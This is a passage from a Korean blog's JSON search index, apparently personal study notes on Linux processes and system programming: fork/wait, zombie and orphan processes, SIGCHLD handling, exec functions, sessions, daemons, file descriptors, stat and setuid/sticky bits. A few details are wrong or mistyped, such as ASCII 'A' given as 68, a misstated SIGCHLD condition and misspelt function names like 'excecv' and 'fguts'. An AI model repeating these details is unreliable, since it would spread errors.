다만, main thread만 pthread_exit으로 종료시키면 process가 종료되지 않고 main thread만 종료되고 다른 thread들은 계속 구동되는 형태가 되므로 주의한다.","title":"Thread"},{"content":"Process Program vs Process Process : 실행중인 프로그램 Program : 실행 가능한 파일 Process는 메모리에 올라가 있는 상태의 프로그램을 의미한다. C언어 Program to Process C언어로 구성된 프로그램은 전처리 - 컴파일 - 링킹 - 로딩의 과정을 거친다. 전처리 : # 으로 시작하는 라인들을 알맞은 형태로 치환한다. 컴파일 : C언어(high-level language)를 어셈블리어(기계어) 로 변환한다. 링킹 : 외부의 ELF(Executable and Linkable Format) 파일들을 호출할 수 있도록 연결한다. 로딩 : 최종 생성된 파일을 실행시켜 메모리에 올려 프로세스로 만든다. 리눅스에서는 execv() 함수에 의해 프로세스화 된다. 프로세스 fork fork() 함수는 프로세스를 복사하는 함수이다. unistd.h 헤더에 선언되어 있다. 복사당한 프로세스를 부모 프로세스, 복사해서 생성된 프로세스를 자식 프로세스라 한다. 복사된 자식 프로세스도 fork 실행 이후부터 코드가 진행된다. fork 함수의 반환값은 pid_t 타입이다. 반환값이 -1이라면 실패를 의미한다. 결과가 0이라면 현재 프로세스는 자식 프로세스임을 의미한다. 0이 아니닌 값이라면 현재 프로세스는 부모 프로세스이다. 반환값은 자식프로세스의 process id를 의미하며, 리눅스 명령어 ps -ef 로 pid를 확인 할 수 있다. Race Condition : 일단 fork가 되어 프로세스가 부모 자식으로 나뉘면, 프로세스의 실행은 병렬적으로 이루어지며, 같은 코드라도 어느 것이 먼저 동작할지 알 수 없다. wait fork() 로 자식 프로세스를 생성한 후 자식 프로세스가 exit()를 호출하여 종료될 때, 부모 process는 자식 process의 종료 결과를 wait() 으로 받을수 있다. wait(statloc *status) : 자식 process에서 호출된 exit() 함수 안에 들어간 인자값을 status(인자는 4byte int지만, 사용하는 부분은 2byte) 에 담아낸다. status 값은 상위 1byte와 하위 1byte를 구분해서 사용한다. 정상적으로 종료가 된경우는 exit() 함수에 의한 종료를 의미하며, status의 상위 1byte에 exit의 인자값을 담아낸다. 비정상 종료는 signal에 의한 종료를 의미하며, signal 번호 값을 status의 하위 1byte에 담아낸다. 0~7번 bit : 자식 process 정상종료시 종료 status 8번 bit : core dump 여부 9~15번 bit : 시그널 번호 status값을 인자로 받아 종료 사유를 회신하는 매크로 함수를 사용하면 쉽게 판단할 수 있다. WIFEXITED, WEXITEDSTATUS, WIFSIGNALED \u0026hellip; 메모리 부모 프로세스를 복사해 자식 프로세스를 생성해도 code 영역은 공유된다. code 영역은 read only memory 이기 때문에 자식 프로세스는 부모 프로세스의 ram 영역 값도그대로 복사 해 온다. 하지만, 자식 프로세스가 새성될 당시 메모리가 바로 복사되는 것이 아니라, 메모리에 값을 작성하는 시점에 복사가 된다. 즉, 부모나 자식 프로세스에서 값을 덮어쓰거나 새로 생성하지 않은 변수에 대해서는 같은 메모리를 바라보고 있다고 볼 수 있다. 메모리는 reference count를 들고 있어 몇개의 프로세스에서 해당 영역을 참조하는지 체크한다. 프로세스 생명 주기 (Life Cycle) 모든 프로세스는 부모 프로세스가 있고, 가장 최초로 실행된 프로세스를 init 프로세스라 하며, init 프로세스의 pid는 1이다.\n생성된 프로세스는 exit() 함수를 호출하면 종료된다. (일반적으로 main 함수의 리턴값이 exit을 호출하도록 되어있다.)\nexit은 라이브러리로 버퍼를 flush하고, open된 모든 파일을 close하고, 프로세스가 사용하고 있는 메모리 풀을 반환한다. 그후 _exit 을 호출하여 프로세스를 종료시킨다.\n하지만, exit만 호출되었다고 해서 프로세스가 완벽하게 종료되는 것이 아니다. exit을 호출하면 부모 프로세스에서 상태코드(exit의 인자값)를 받아가기를 대기한다. 메모리의 반환 작업은 부모 프로세스의 처리가 끝나야 이루어진다.\nexit의 결과값을 처리하는 함수는 wait 이다. 부모 프로세스에서 wait을 실행하면 그제서야 자식 프로세스는 메모리를 정리하고 완벽하게 종료된다. (커널 레벨에서 자식은 부모를, 부모는 자식들의 포인터를 갖고 있어 서로 참조할 수 있도록 연결되어 있다.) 좀비 프로세스 부모 프로세스에서 wait를 호출하지 않아 자식 프로세스를 정리해 주지 않으면 좀비 프로세스가 생성된다. 좀비 프로세스는 사용하지 않는 메모리 및 리소스들을 차지하고 있어서 다른 프로세스들의 성능을 저하시킨다. 고아 프로세스 자식 프로세스보다 부모 프로세스가 먼저 종료되는 경우, 그 자식 프로세스들은 고아 프로세스가 된다. 고아 프로세스들은 종료 처리를 해줄 부모 프로세스가 없기 때문에 좀비 프로세스가 될 수 있는데, 이를 막기 위해 커널은 고아 프로세스를 주기적으로 찾아 \u0026lsquo;init\u0026rsquo; 프로세스의 자식으로 재설정한다. signal wait() 함수를 호출하면 부모 프로세스는 자식 프로세스가 exit를 호출하기를 기다린다.\n이렇게 되면, 부모 프로세스는 다른 동작을 수행하지 못하여 concurrent한 동작 수행이 불가능하다.\n부모가 자기 할 일을 수행하다 자식이 종료될 떄 종료 처리를 해 주도록 하려면 signal 기능을 사용하면 된다.\n자식 프로세스에서 exit를 호출하면 내부적으로 부모 프로세스에 SIGCHLD(sig child) 시그널을 보내도록 되어 있다. 부모 프로세스에서는 signal(SIGCHLD, my_function) 형태로 SIGCHLD 시그널의 처리를 my_function 으로 받아서 처리하도록 하고, myfunction 안에서 wait을 호출하면 된다. signal(SIGCHLD, my_function);\r...\rfork()\r...\rmy_function() { wait(0); } 단, 자식 프로세스가 여러개인 경우, 동시에 종료되는 자식 프로세스들에 대해서는 단순 signal 로 처리가 불가능하다.\nsignal이 호출되어 my_function이 돌고 있는 도중에 다음 signal이 호출되면, my_function 함수가 또 호출되지 않는다. 해당 signal은 무시되는 것이다.\n하지만, signal은 무시되더라도 \u0026lsquo;부모 프로세스가 처리해야할 목록\u0026rsquo; 에는 추가되기 때문에, wait()를 반복한다면 동시에 종료된 자식 프로세스들도 처리할 수있다.\n또한 wait 대신 waitpid 를 사용하여 timeout을 짧게 가져가는 식으로 부모 프로세스의 concurrency도 보장할 수 있다. (WNOHANG 옵션으로 더이상 처리할 내용이 없으면 기다리지 않도록 할 수 있음)\nmy_function() { while ( waitpid(-1, 0, WNOHANG) \u0026gt; 0 ); } 하지만, SIGCHLD 시그널은, 자식 프로세스가 종료 되었을 때 뿐 아니라, 정지되었을 때도 호출된다. signal 설정 옵션으로 자식 프로세스가 종료되었을 때 날아오는 SIGCHLD 는 처리하지 않도록 설정해야 완벽하다.\nsignal의 상위호환인 sigaction 함수를 사용하면 flag를 설정하여 처리 가능하다. Init Process init 프로세스는 고아 프로세스들을 모아서 종료시켜준다. init 프로세스는 socketpair() 을 사용하여 3번4번 entry에 socket을 하나씩 연다. 3번 socket은 4번 socket으로 pipeline이 연결되어 있다. signal handler가 프로세스에서 고아 프로세스를 감지하면 3번 entry의 socket으로 데이터를 write 하면, init 프로세스의 4번 socket에서 데이터가 튀어나온다. 4번 socket에서 데이터를 받은 init 프로세스는 받은 데이터를 기반으로 고아 프로세스를 처리한다. 이런 식으로 구조를 짜면, 커널에서 직접 프로세스를 처리하지 않고, init process가 프로세스 처리를 하도록 할 수 있다. | signal handler | ---write()------↴ ↷ |[0] [1] [2] [3] [4]|\r| init process ↙ |\r| wait() |\r| | | | | | exec 함수 system() 이라는 라이브러리 함수로 커널 명령을 실행할 수 있다. 내부적으로 exec 함수들을 사용한다.\nexec뒤에 붙은 글자에 따라 인자로 받는 데이터의 형태나 종류가 달라지며, 여러 속성들을 합해서 사용 가능하다. exec함수들은 execve 를 제외하고는 모두 라이브러리이며, 최종적으로 execve를 호출한다. l : 리스트 형태의 인자를 받아 명령어 호출시 전달\nex) execl(\u0026quot;ls\u0026quot;, \u0026quot;-l\u0026quot;) v : 벡터 형태의 인자를 받아 명령어 호출시 전달\nex) char* cmd[] = {\u0026#34;/bin/ls\u0026#34;, \u0026#34;ls\u0026#34;, \u0026#34;-l\u0026#34;, null}; // 파일 위치, 프로세스 이름, argument\rexcecv(cmd); e : 환경변수를 인자를 받아 명령어 호출시 전달\nex) char* env[] = {\u0026#34;name=justin\u0026#34;, \u0026#34;age=20\u0026#34;, null}; excece(cmd); ex) v와e를 혼합해서 사용 가능 char* cmd[] = {\u0026#34;/bin/ls\u0026#34;, \u0026#34;ls\u0026#34;, \u0026#34;-l\u0026#34;, null}; // 파일 위치, 프로세스 이름, argument\rchar* env[] = {\u0026#34;name=justin\u0026#34;, \u0026#34;age=20\u0026#34;, null}; excecve(cmd, env); c에서 main 함수는 int main(int argc, char** argv, char** envp) 형태이다. argc: 인자의 갯수 argv: 인자의 배열 envp: 환경변수의 배열 p : 환경변수 path를 참조하여 명령어 실행\nexec 파일들은 기본적으로 path를 참조하지 않고 실행되어 명령어 파일의 절대경로를 인자로 넣어야 한다. p옵션이 붙은 함수를 사용하면 환경변수 path를 사용하여 명령어를 실행할 수 있다. ex) execlp(\u0026quot;ls\u0026quot;, \u0026quot;ls\u0026quot;, \u0026quot;-l\u0026quot;, null) 쉘을 이용한 옵션처리 execlp(command, command, null); 형태로 실행하지 않고, execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-c\u0026quot;, command, null); 형태로 실행하면 \u0026lsquo;command\u0026rsquo; 명령을 쉘이 실행하게 되어 옵션을 알아서 처리해 준다. exec로 생성한 프로세스의 속성 상속되는 속성 파일 디스크립터 사용자 ID, 그룹 ID, 프로세스 그룹 ID, 세션 ID, 제어 터미널 alarm 시그널 남은 설정시간 작업 디렉터리, root 디렉터리 파일 잠금 여부, 파일 생성 마스크 자원 제약, CPU 사용시간 상속되지 않는 속성 signal의 처리는 SIG_IGN 처리되던 시그널 외에는 default로 복구된다. 유효 사용자 ID (파일 속성에서 set_user_ID 비트가 설정된 경우) 유효 그룹 ID (set_group_id 비트가 설정된 경우) reference count exec를 사용하여 프로세스를 호출하면, 그 아래 line들은 실행이 되지 않는다. 프로세스는 코드 영역 메모리를 참조하고, 메모리는 reference count를 두어 몇개의 프로세스가 해당 메모리를 참조하는지 체크한다. 이때, exec를 사용하면 기존 프로세스는 code 영역을 내버려두고 exec에서 사용할 새로운 코드영역을 참조하게 된다. (+program counter 이동) 그렇게 되면 기존에 남아있던 코드 영역 메모리는 reference count가 0이되어 더이상 사용하지 않는 메모리로 취급되어 free된다. -\u0026gt; fork와 exec를 함께 사용하면 exec 아래의 코드도 실행할 수 있게 할 수 있다.\n...\rpid = fork()\rif (pid)\rexec(...);\rwait(0);\rsomething_to_do(); // 부모 process에서 실행 가능\r... 프로세스 그룹 하나 이상의 프로세스들의 집합을 프로세스 그룹이라 한다. 일관된 작업을 하는 프로세스들을 그룹으로 묶어서 관리하며, 이 그룹은 고유한 \u0026lsquo;프로세스 그룹 ID\u0026rsquo; 를 갖는다. 프로세스 그룹에는 \u0026lsquo;프로세스 그룹 리더\u0026rsquo; 가존재한다. 리더는 프로세스 그룹 ID와 동일한 값을 프로세스 ID로 가진 프로세스이다. 리더는 그룹 및 그룹내의 프로세스의 생성/종료 권한을 가진다. 리더가 종료되거나 그룹을 떠나면 해당 프로세스 그룹 내의 다른 프로세스가 리더 권한을 위임받는다. 그룹 내의 마지막 프로세스가 그룹을 떠나면 해당 그룹은 사라진다. pipe 명령으로 묶어서 한번에 실행한 명령들은 같은 프로세스 그룹에 묶인다. 그룹 제어 함수 getpgrp, setpgid getpgrp 호출한 프로세스가 속한 프로세스 그룹 ID를 리턴하는 함수 setpgrid(PROCESS_ID, PROCESS_GROUP_ID) 새로운 프로세스 그룹을 생성하거나, 선택한 프로세스를 특정 그룹에 합류시키는 함수 PROCESS_ID 와 PROCESS_GROUP_ID를 동일한 수를 넣어주면, 해당 프로세스를 리더로 승격시킨다. 자기 자신이나 자식 프로세스의 그룹ID만 변경 가능하며, exec를 수행한 자식 프로세스의 그룹ID는 접근할 수 없다. 세션 일반적으로 같은 터미널에서 수행되고 있는 프로세스 그룹들을 모은 집합을 session이라 한다. 세션, 프로세스 그룹, 프로세스 간 연관관계는 프로세스 ⊂ 프로세스 그룹 ⊂ 세션 형태이다. 세션도 unique한 번호를 가지며 이를 세션ID라 한다. 세션ID와 동일한 프로세스ID를 가진 프로세스를 세션 리더라 한다. 한 세션의 프로세스들은 하나의 foreground 프로세스와 다수의 background 프로세스로 이루어져 있다. foreground 프로세스는 현재 키보드 input을 받을 수 있는 유일한 프로세스이다. 세션 제어 함수 setsid 새로운 세션을 생성하여 특정 프로세스를 해당 세션으로 이동하는 함수이다. 호출한 프로세스가 프로세스 그룹 리더가 아닌 경우에만 실행 가능하다. 프로세스 그룹에 프로세스가 하나밖에 없더라도, fork로 생성된 자식 프로세스는 그룹 리더가 아니기 때문에 setsid를 호출할 수 있다. 새로운 세션이 생성되면, 프로세스 그룹도 신규로 생성하고, 그 안에 프로세스를 이동시킨다. 이동된 프로세스는 세션 리더이자 프로세스 리더가 된다. setsid 명령은 제어 터미널을 갖지 않기 때문에 기존에 연결되어있던 터미널과의 연결이 끊기게 된다. 제어 터미널 하나의 세션은 하나의 제어 터미널을 가질 수 있다.\n프로세스에서 가상 터미널은 \u0026lsquo;pts\u0026rsquo;, 실제 터미널은 \u0026rsquo;tty\u0026rsquo; 라 표시된다. 세션 리더는 제어 터미널과의 연결을 관할한다.\ntcgetpgrp : foreground 프로세스 그룹ID를 반환한다.\ntcsetpgrp : 제어터미널을 갖고 있는 경우, 특정 프로세스 그룹을 전위 프로세스 그룹으로 설정한다.\nstty -a 명령으로 확인시 작업제어를 위한 시그널이 설정되어 있음을 확인할 수 있다.\nDaemon Process 제어 터미널 없이 주기적으로 주어진 일을 처리하거나, 특정 이벤트를 대기하기 위해 background에서 돌고있는 프로세스 보통 시스템이 부팅될 때 시작되며, shutdown 될 때 종료된다. 다른 프로세스가 발생한 시그널에 간섭받지 않아야 한다. 데몬 프로세스는 터미널과 연결이 되어있지 않기 때문에 터미널로 입력/출력을 할 수 없다. 출력은 printf 대신 syslog 를 사용하여 시스템 로그로 출력을 하도록 해야한다. Daemon 구현 방법 fork()로 child process를 생성하고 parent process를 종료한다. child process에서 setsid() 함수로 새로운 세션을 생성한다. background로 실행 가능하며, 터미널에 영향을 받지 않게됨 열려진 모든 file descriptor를 닫는다. 1~64까지 index를 순회하며 close() 로 file descriptor를 모두 닫는다. 작업 디렉터리를 root(\u0026quot;/\u0026quot;)로 바꿔서 다른 파일 시스템의 unmount 동작에 영향을 주지 않도록 한다. chdir(\u0026quot;/\u0026quot;); 로 작업 디렉터리를 옮길 수 있다. 파일 생성 마스크를 0으로 설정한다. umask(0) 명령으로 umask값을 없애준다. umask란, 프로세스에서 생성되는 파일의 파일 접근 권한 설정시 해당 값을 빼도록 설정된 값이다. 즉, 초기 파일 권한 666에서 umask값을 뺀 값이 생성된 파일의 권한이 된다. (디렉터리는 초기값 777) SIGCLD 시그널을 무시한다. signal(SIGCHLD, SIG_IGN) 를 통해 자식이 발생하는 시그널을 무시하도록 설정해야 데몬이 생성한 프로세스들이 좀비 프로세스가 생성되지 않는다. 직접 wait를 해서 처리 해줘도 된다. ","permalink":"https://aswinblue.github.io/Blog/post/linux/process/","summary":"Process Program vs Process Process : 실행중인 프로그램 Program : 실행 가능한 파일 Process는 메모리에 올라가 있는 상태의 프로그램을 의미한다. C언어 Program to Process C언어로 구성된 프로그램은 전처리 - 컴파일 - 링킹 - 로딩의 과정을 거친다. 전처리 : # 으로 시작하는 라인들을 알맞은 형태로 치환한다. 컴파일 : C언어(high-level language)를 어셈블리어(기계어) 로 변환한다. 링킹 : 외부의 ELF(Executable and Linkable Format) 파일들을 호출할 수 있도록 연결한다. 로딩 : 최종 생성된 파일을 실행시켜 메모리에 올려 프로세스로 만든다.","title":"Process"},{"content":"System Programming 프로그램이 동작하는 구조는 크게 application, kernel, HW 로 분리할 수 있다. _____________\r| Library |\r¯¯¯¯¯¯¯¯¯¯¯¯¯ Application level\r------------------------------\r_____________\r|System call|\r¯¯¯¯¯¯¯¯¯¯¯¯¯ Kernel level\r------------------------------\r_____________\r| Hardware |\r¯¯¯¯¯¯¯¯¯¯¯¯¯ H/W level\r------------------------------ application level에서는 library를 사용하며, 이 코드들은 library buffer를 사용한다. (open(), read(), write(), close() \u0026hellip;) 시스템에서 제공하는 최적의 buffer 단위로 disk에서 값을 읽어오고, library buffer에 담아두면 작은단위로 읽어올 때 효율적이다. 예를들어, 한 줄씩 파일을 읽어야 한다면, 1byte씩 파일에서 \u0026lsquo;\\n\u0026rsquo;을 감지할 때 까지 읽을 수 있지만, BUF_SIZ만큼 파일에서 읽어서 library buffer에 담아두고 library buffer를 1byte씩 읽으며 \u0026lsquo;\\n\u0026rsquo;를 찾는 것이 실행 속도는 더 빠르다. (IO접근은 적을수록 효율적) Kernel level에서는 System call을 사용하며 system buffer를 사용한다. application level 함수를 사용하면, 보통 library buffer를 1차적으로 사용하고, 내부적으로 system call을 수행해 system buffer를 2차적으로 사용하게 된다. printf는 c library 함수이며, \u0026lsquo;\\n\u0026rsquo;을 만나야 화면상에 출력을 한다. \u0026lsquo;\\n\u0026rsquo;이 입력되기 전 까지 문자열들은 library buffer에 기록된다. fprintf는 \u0026lsquo;\\n\u0026rsquo;과 상관없이 문자열을 출력한다. 즉 library buffer를 사용하지 않는다. 파일 입출력 fgetc C에서 파일에 접근하기 위해서는 fopen 함수를 사용한다. fopen은 파일 포인터를 반환하며, 코드 내에서 파일 포인터로 해당 파일에 접근이가능하다. fgetc(FPTR) 함수는 fopen으로 연 파일 포인터를 참조해서 char 하나를 읽고 반환한다. fgetc 함수의 반환 값은 int 형태이다. text file을 읽을 땐, 0xFF값이 내용에 올 수 없지만, binary file을 읽을 땐 중간에 0xFF 값이 올 수 있다. char 형태로 0xFF를 읽으면 -1값에 해당하기 때문에, EOF와 구분이 불가능하여 char 대신 int를 반환하도록 되어있다. 파일 구조체 fopen은 파일 구조체의 주소(포인터)를 반환한다. 파일 구조체는 아래와 같은 내용을 담고 있다. _flags: _IO_read_ptr : 다음 명령시 파일을 읽거나 쓸 위치 _IO_read_end: kernel에서 데이터를 받아서 저장할 버퍼의 끝 위치. _IO_read_base: kernel에서 데이터를 받아서 저장할 버퍼의 시작 위치. 파일에 대한 읽기 명령(fgetc/fgets등) 이 발생했을 때, kernel은 4096byte(BUF_SIZE) 만큼 데이터를 미리 읽어서 이곳에 채워둔다. _fileno: 파일의 offset, kernel에서 해당 파일에 정해준 index(kernel 함수에서 사용할 수 있다.) fopen 시에 파일 구조체가 생성 및 초기화 되지만, IO_read* 인자들은 파일 접근이 이루어짐과 동시에 값이 적용된다. EOF 파일을 끝까지 읽었다고 판단하는 것은, EOF 문자(-1) 으로 판단한다. 하지만 실제파일을 읽어보면 마지막에 -1값이 실제로 들어있지는 않다. EOF 값은 file I/O 함수의 리턴값일 뿐 실제 파일에 기입된 값이 아니다. file I/O 함수는 i-node에 기록된 파일의 크기를 기반으로 파일 끝을 판단한다. ASKII 코드 중 주요 문자의 값 참조 a: 97 A: 68 0: 48 \\n: 10 \\r: 13 (공백): 32 \\t: 9 \\0: 0 fguts(BUFF, SIZE, FPTR) 함수는 fopen으로 연 파일 포인터를 참조해서 line 하나를 읽어온다. fputs(BUFF, FPTR) 함수는 fopen으로 연 파일 포인터를 참조해서 line 하나를 출력한다. 리눅스에서 표준 입력/출력/에러는 기본적으로 파일 포인터를 열어둔다. 각각 아래 문자열 혹은 번호로 참조 가능하다. stdin : 표준 입력 stdout : 표준 출력 stderr: 표준 에러 -\u0026gt; 파일 포인터 대신 stdout 을 입력하면 표준 출력으로 문자열이 출력된다. (ex: fputc(BUF, stdout))\nfile offset fopen 으로 파일을 열게 되면 user는 파일의 읽고 쓸 위치를 설정하지 않는다. 파일을 읽고 쓸 위치를 file offset이라고 하며, kernel 내부의 파일 구조체를 사용하여 kernel에서 자체적으로 관리된다. fseek \u0026amp; ftell fseek(FILE_POINTER, OFFSET, POSITION) : 파일의 POSITION에서 offset 만큼 file offset을 이동. POSITION은 아래 세 가지를 사용 가능하다. SEEK_SET : 파일의 처음 위치 SEEK_CUR : 현재 커서(file offset)의 위치 SEEK_END : 파일의 끝 위치 반환값은 이동 후 file offset의 값이다. ex) fseek (fp, 0, SEEK_SET): 커서를 파일 처음으로 이동 ex) fseek (fp, -10, SEEK_END): 커서를 파일 끝에서 10바이트 앞으로 이동 ex) fseek (fp, 10, SEEK_CUR): 커서를 현재 위치에서 10바이트 뒤로 이동 ftell(FILE_POINTER) : 현재 file offset을 반환 입출력 속도 fgetc / fputc : 바이트 단위로 파일을 읽거나 쓰는 함수 fgets / fputs : 라인 단위로 파일을 읽거나 쓰는 함수 (버퍼가 허용하는 한) fread / fwrite : 특정 크기만큼 파일을 읽고 쓰는 함수\n-\u0026gt; 버퍼 접근 횟수를 적게 할 수록 속도 측면에서 유리하다. (1 \u0026lt; 2 \u0026lt; 3) Application Library vs System Call stdio.h vs fcntl.h : application library는 stdio.h 헤더를, system call은 fcntl.h 헤더에 함수가 정의되어 있다. fopen(FILE_POINTER, TYPE) vs open(FILE_DESCRIPTOR, FLAG, AUTHORITY) : 파일을 여는 함수 fopen은 FILE 타입의 file pointer를 사용하지만, open은 int 타입의 file descriptor를 사용한다. fopen은 \u0026ldquo;r\u0026rdquo;, \u0026ldquo;w\u0026rdquo; 등 파일 용도를 지정하지만, open은 flag로 읽기/쓰기 등 옵션을 적용한다. (flag는 | 연산자로 복합 적용할 수 있음) O_RDONLY: 읽기 전용 O_WRONLY: 쓰기 전용 O_RDWR: 읽기/쓰기 모두 O_CREAT: 파일 없으면 생성 O_EXCL: 파일 존재시 error 반환 O_APPEND: 기존에 있던 파일 맨 뒤부터 이어쓰기 O_TRUNC: 기존에 있던 파일 지우고 처음부터 쓰기 fread vs read : 파일을 읽는 함수 fwrite vs write : 파일에 출력하는 함수 fclose vs close File Descriptor 리눅스에서 파일을 열면, 현재 열어둔 파일마다 index를 매기고, 이를 배열에 저장한다. 이 배열을 file descriptor array라 하고, index를 file descriptor라 한다. file descriptor array의 각 item들은 file structure를 가리킨다. ↱ file descriptor array\r[0] -\u0026gt; [file structure A]\r[1] -\u0026gt; [file structure B]\r[2] -\u0026gt; [file structure C]\r[3] -\u0026gt; [file structure D] file structure는 파일의 metadata를 저장하고 있다(크기, file offset 등). 파일을 열면, 커널 내부적으로 커서를 두고, 어느 위치를 읽을지/쓸지 결정한다. 이를 file offset이라 칭한다. 리눅스는 실행시 stdin, stdout, stderr를 파일 형태로 열고, 이는 각각 0, 1, 2 index에 해당한다. 이후 open() 함수에 의해 열리는 파일들은 3번부터 순서대로 indexing 되며, 이는 커널이 알아서 설정하며 user는 관여할 수 없다. 동일한 이름의 파일들을 여러 번 열더라도, 새로운 file descriptor에 할당된다. Redirection dup(FILE_DESCRIPTOR) 명령은 FILE_DESCRIPTOR 에 해당하는 file structure 주소를 새로운 file descriptor에 담고 반환한다.\n새로운 file structure를 만들지 않고 주소만 복사 해 오기 때문에, 얕은 복사와 같이 file structure 내부의 모든 인자를 두 개의 file descriptor에서 참조할 수 있다. 이 때문에 file structure 에는 몇개의 file descriptor가 file structure를 참조하고 있는지를 나타내는 count 인자가 존재한다. 표준 입출력 에러는 0,1,2 file descriptor를 사용하고 있는데, 이를 close하고 dup를 이용해 원하는 파일 descriptor를 0,1,2 자리에 넣을 수 있다.\n예를 들어 close(1); dup(fd1);을 수행하면 표준 출력을 close하고 1번 descriptor에 fd1 파일을 연결하게 된다.\napplication library에서 표준 입출력을 사용할 때, 내부적으로 read(0, ...), write(1, ...) 을 사용하고 있으므로, printf(\u0026quot;HELLO\u0026quot;); 을 하면 표준 출력으로 \u0026ldquo;HELLO\u0026rdquo; 가 출력되게 된다.\n-\u0026gt; 이렇게 file descriptor 연결 구조를 재구성 하는 작업을 redirection이라 한다.\n파일의 속성 struct stat buf;\rint s = stat(\u0026#34;./file\u0026#34;, \u0026amp;buf); // 성공시 0, 실패시 -1 stat(FILE_NAME, STAT_STRUCT): FILE_NAME 파일에서 stat 데이터(파일 정보)를 추출해 STAT_STRUCT 버퍼에 저장, 데이터는 struct stat 형태이다. sys/stat.h 헤더파일에 정의되어 있다. .st_mode: 2byte로 구성되며, 파일의 종류와 권한을 나타낸다. 파일의 종류는 처음 4bit로 구분이 가능하다. regular, directory, symbolic link 등 종류가 있다. S_ISREG(st.st_mode), S_ISDIR(st.st_mode), S_ISLNK(st.st_mode) 등 매크로로 쉽게 확인 할 수 있다. 다음 3bit는 특수 권한을 타나낸다. 각 bit는 owner, group, other의 특수권한 여부를 나타낸다. 다음 3bit는 owner의 권한을 나타낸다. 각 bit는 read(읽기), write(수정), execute(실행) 권한을 나타낸다. 다음 3bit는 group의 권한을 나타낸다. 각 bit는 read(읽기), write(수정), execute(실행) 권한을 나타낸다. 다음 3bit는 other의 권한(이외 다른 사람)을 나타낸다. 각 bit는 read(읽기), write(수정), execute(실행) 권한을 나타낸다. 디렉터리도 read/write/execute권한을 가지고 있지만, 의미가 달라진다. read : 디렉터리 참조 권한(ls명령) write : 디렉터리 내부에 파일 생성 혹은 삭제 권한 execute : 디렉터리 내부로 이동 권한(cd 명령) 파일 종류\r| 특수권한\r| | owner권한\r| | | group권한\r| | | | ┌ other권한\r[0000][000][000][000][000] .st_nlink 값은 파일에 걸려있는 hard link의 갯수를 나타낸다. (unsigned long int)\n.st_uid 값은 파일을 소유한 user의 uid값을 나타낸다.\n/etc/passwd 경로에 username과 uid 매핑 테이블이 있다. getpwuid 함수로 uid를 넘겨주면 struct passwd 구조체 포인터를 반환해 주는 함수가 있으므로, 사용자 정보가 필요할 경우 이를 사용하면 된다. struct passwd 에는 /etc/passwd 파일에 적히는 데이터들을 그대로 구조체로 담아낸 형태이며, pw_name, pw_passwd, pw_uid, pw_gid 등 데이터를 참조 가능하다. pwd.h 헤더에 정의되어 있다. .st_gid 값은 파일이 속한 group의 gid 값을 나타낸다.\ngetgrgid 함수로 gid를 넘겨주면 struct group 구조체 포인터를 반환해주는 함수가 있다. grp.h 헤더에 정의되어 있다.. 파일 하나에 속한 그룹은 한개 이상일 수 있다. .st_size 값은 파일 크기를 의미한다. (unsigned long int)\n.st_mtime 값은 파일을 마지막으로 수정한 시간이며, 이는 epoch time 값이다.\nctime 함수를 사용하여 ctime(\u0026amp;st.st_mtime)을 활용하면 사용자 친화적으로 변경된 string을 출력할 수 있다. time.h 헤더파일에 정의되어 있다. localtime 함수를 사용하면 epoch time을 받아서 struct tm 구조체에 담아주어 ctime보다 더 유연하게 출력 형태를 정의할 수 있다. ex) printf(\u0026quot;%d월 %d일 %02d:%02d\u0026quot;, _tm-\u0026gt;tm_mon + 1, _tm-\u0026gt; tm_day, _tm-\u0026gt;tm_hour, _tm-\u0026gt;tm_min); .st_rdev 값은 device ID 값으로, 상위 1byte는 major 번호, 하위 1byte는 minor 번호이다. ls 입력시 block device 파일(S_IFBLK)이나 char device 파일(S_IFCHR)들은 파일 크기 대신 major 번호, minor 번호를 출력한다. 심볼릭 링크에 대해 stat을 사용하면, 원본 파일의 정보를 받아오지만, lstat을 사용하면 symbolic link 파일 자체의 정보를 받아온다.\nsymbolic link가 가리키는 원본 파일의 이름은 readlink() 함수에 file path를 넣어 받아올 수 있다. unistd.h 헤더에 선언되어 있다. ls 명령어도 이 정보를 참조하여 파일 정보를 출력 해 준다.\n특수 권한 특수 권한은 3비트로 이루어져 있고, 각각 set_user_id bit, set_group_id bit, sticky bit 를 의미한다. Set User Id\n퍼미션의 일반적인 룰 상 수정할 수 없는 파일도 set_user_id bit를 활성화 하면 수정이 가능하게 된다. ex) 비밀번호는 /etc/shadow 파일에 저장되지만, 이 파일은 일반 user들이 접근할 수 없도록 권한이 설정되어 있다. 하지만, passwd 명령어로 비밀번호를 바꾸면, /etc/shadow에 저장된 비밀번호도 변경할 수 있다. 파일을 실행했을 때 권한은 파일의 소유자가 아닌 실행한 유저의 권한을 따른다. (ps -ef 명령으로 권한 확인 가능) 하지만 set_user_id 비트가 설정된 파일을 실행할 때 파일의 소유자의 권한을 얻게 된다. set_user_id 가 설정되면 ls 명령시 owner의 execute 권한이 \u0026rsquo;s\u0026rsquo; 혹은 \u0026lsquo;S\u0026rsquo;로 표시된다. Sticky Bit\n파일을을 읽고 쓰고 실행하는 것은 \u0026lsquo;파일\u0026rsquo; 자체의 권한을 따른다. 하지만 파일을 생성하고 지우는 것은 파일이 속한 \u0026lsquo;디렉터리\u0026rsquo;의 권한을 따른다. sticky bit를 설정하면 해당 파일은 \u0026lsquo;삭제\u0026rsquo; 동작에 대해 디렉터리의 권한을 따르지 않고, 파일의 소유자만 삭제할 수 있도록 설정된다. sticky bit가 설정되어 있으면 ls 명령시 other의 execute 자리에 \u0026rsquo;t\u0026rsquo; 혹은 \u0026lsquo;T\u0026rsquo;로 표시된다. 연결 계수 \u0026amp; 참조 계수 파일이 지워지는 시점은 연결 계수와 참조 계수가 모두 0이되는 시점이다. 연결 계수\n파일을 생성하면 directory entry와 inode 구조체, data 영역이 생성된다. inode 구조체에는 연결계수(nlink) 값이 1로 설정된다. unlink(D_ENTRY) 함수로 특정 directory entry를 삭제할 수 있다. directory entry가 삭제되면 해당 entry가 참조하던 inode 구조체의 nlink(연결계수) 값도 하나 줄어든다. i-node의 nlink 값이 0 이라면 inode 더이상 해당 파일을 참조하는 entry가 없는 것이다. unlink가 된 시점에 이미 directory entry가 삭제되었기 때문에 해당 파일을 새로 열거나 참조할 방법이 없어진다. 참조 계수\nopen() 함수로 file 구조체를 생성하고, file 구조체는 inode 구조체를 참조한다. inode 구조체는 해당 nlink를 참조하고 있는 \u0026lsquo;file 구조체\u0026rsquo;의 갯수를 count라는 값으로 저장한다. close() 함수로 파일을 닫으면, 파일 구조체가 참조하던 nlink의 참조 계수가 하나 줄어든다. 연결 